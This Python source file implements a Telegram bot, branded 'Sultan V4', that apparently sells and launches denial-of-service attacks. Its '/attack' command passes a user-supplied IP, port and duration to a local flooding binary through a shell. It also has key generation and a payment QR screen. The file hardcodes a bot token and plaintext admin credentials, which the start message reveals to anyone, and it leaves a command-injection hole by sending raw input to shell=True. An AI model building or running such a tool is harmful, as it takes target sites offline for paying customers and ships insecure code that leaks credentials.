import telebot, subprocess, threading, os, time
from flask import Flask
from telebot import types

# --- CONFIGURATION ---
TOKEN = "8586393188:AAFH26YqG47jqc4sRyUWCjsjd-chZQRwyQ0"
bot = telebot.TeleBot(TOKEN)
app = Flask('')

# Sultan's Info
ADMIN_ID = 5961723105
ADMIN_USER = "saniya"
ADMIN_PASS = "suhan"
logged_in = []
QR_PHOTO_ID = None 

@app.route('/')
def home(): return "Sultan V4 Button Mode Active"

def run_web():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

def is_admin(uid):
    return uid == ADMIN_ID or uid in logged_in

# --- MAIN MENU BUTTONS ---
def main_menu(message):
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("🚀 Attack", callback_data="btn_attack")
    btn2 = types.InlineKeyboardButton("🔑 Gen Key", callback_data="btn_genkey")
    btn3 = types.InlineKeyboardButton("📸 Set QR", callback_data="btn_setqr")
    btn4 = types.InlineKeyboardButton("💳 Buy/Pay", callback_data="buy")
    markup.add(btn1, btn2, btn3, btn4)
    bot.send_message(message.chat.id, "🔱 **SULTAN V4 DASHBOARD** 🔱\n\nNiche diye gaye buttons ka use karein:", reply_markup=markup)

# --- COMMANDS ---
@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "🔱 **SULTAN V4** 🔱\n\nAdmin login karein: `/login saniya suhan` aur buttons payein.")

@bot.message_handler(commands=['login'])
def login(message):
    args = message.text.split()
    if len(args) == 3 and args[1] == ADMIN_USER and args[2] == ADMIN_PASS:
        if message.from_user.id not in logged_in: logged_in.append(message.from_user.id)
        bot.reply_to(message, "🔓 **SULTAN ACCESS GRANTED!**")
        main_menu(message)
    else:
        bot.reply_to(message, "🚫 Wrong Credentials!")

# --- CALLBACK HANDLER ---
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == "btn_attack":
        bot.send_message(call.message.chat.id, "🚀 **Attack Command:**\nLikh kar bhejo: `/attack <IP> <PORT> <TIME>`")
    
    elif call.data == "btn_genkey":
        if is_admin(call.from_user.id):
            key = f"SULTAN-{os.urandom(2).hex().upper()}"
            bot.send_message(call.message.chat.id, f"🔑 **NEW KEY:** `{key}`")
        else:
            bot.answer_callback_query(call.id, "🚫 Login as Admin!")

    elif call.data == "btn_setqr":
        if is_admin(call.from_user.id):
            bot.send_message(call.message.chat.id, "📸 Command likho: `/setqr` aur phir photo bhejo.")
        else:
            bot.answer_callback_query(call.id, "🚫 Login as Admin!")

    elif call.data == "buy":
        if QR_PHOTO_ID:
            bot.send_photo(call.message.chat.id, QR_PHOTO_ID, caption="💳 **SCAN & PAY**")
        else:
            bot.send_message(call.message.chat.id, "❌ No QR set by Admin.")

# --- SET QR COMMAND ---
@bot.message_handler(commands=['setqr'])
def set_qr(message):
    if is_admin(message.from_user.id):
        msg = bot.reply_to(message, "📸 **Admin:** Scanner ka Photo bhejo.")
        bot.register_next_step_handler(msg, save_qr)

def save_qr(message):
    global QR_PHOTO_ID
    if message.content_type == 'photo':
        QR_PHOTO_ID = message.photo[-1].file_id
        bot.reply_to(message, "✅ **Scanner Updated!**")

# --- ATTACK ---
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "🚫 Login First!")
        return
    args = message.text.split()
    if len(args) < 4: return
    ip, port, dur = args[1], args[2], args[3]
    bot.reply_to(message, f"🚀 **ATTACKING:** `{ip}:{port}`")
    subprocess.Popen(f"chmod +x final_beast && ./final_beast {ip} {port} {dur} 10", shell=True)

if __name__ == "__main__":
    threading.Thread(target=run_web).start()
    bot.polling(none_stop=True)
